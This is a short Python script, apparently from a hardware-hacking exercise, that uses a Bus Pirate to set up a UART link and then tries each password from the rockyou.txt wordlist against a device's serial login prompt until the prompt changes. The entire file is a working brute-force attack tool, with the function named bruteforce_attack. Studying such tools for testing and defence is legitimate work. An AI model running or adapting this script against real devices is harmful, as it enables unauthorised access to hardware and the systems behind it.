import time
import serial

COM_PORT = 'COM3'
BAUD_RATE = 115200 

def configure_bus_pirate_uart(ser):
    ser.write(b'm\n')  # Seleccio de modo
    time.sleep(0.1)
    ser.write(b'3\n')  # Selecciona el modo UART
    time.sleep(0.1)
    ser.write(b'6\n')  # Set serial port speed to 19200 bps
    time.sleep(0.1)
    ser.write(b'1\n')  # Set data bits and parity to 8, NONE
    time.sleep(0.1)
    ser.write(b'1\n')  # Set stop bits to 1
    time.sleep(0.1)
    ser.write(b'1\n')  # Set receive polarity to Idle 1
    time.sleep(0.1)
    ser.write(b'2\n')  # Select normal output type
    time.sleep(0.1)
    ser.write(b'W\n')  # Start up the power supplies
    time.sleep(1)
    ser.write(b'(1)\n')  # Select option 1
    time.sleep(0.1)
    ser.write(b'y')  # Respond with 'y'
    time.sleep(0.1)
    ser.reset_input_buffer()
    ser.reset_output_buffer()

def bruteforce_attack(ser,command):
    ser.write(command.encode('utf-8') + b'\n')
    time.sleep(1)  # Add a 1-second delay after sending the command

    # Read available characters without blocking
    output_chars = ser.read(ser.in_waiting).decode('utf-8')

    # Check if the output is different from "Enter Password + ENTER"
    if "Enter Password + ENTER" not in output_chars:
        print("The magic word is:", command)
        exit()

if __name__ == "__main__":
    with open('rockyou.txt', 'r') as f:
        wordlist = f.read().splitlines()
    ser = serial.Serial(COM_PORT, BAUD_RATE, timeout=1)
    configure_bus_pirate_uart(ser)
    for word in wordlist:
        bruteforce_attack(ser, word)
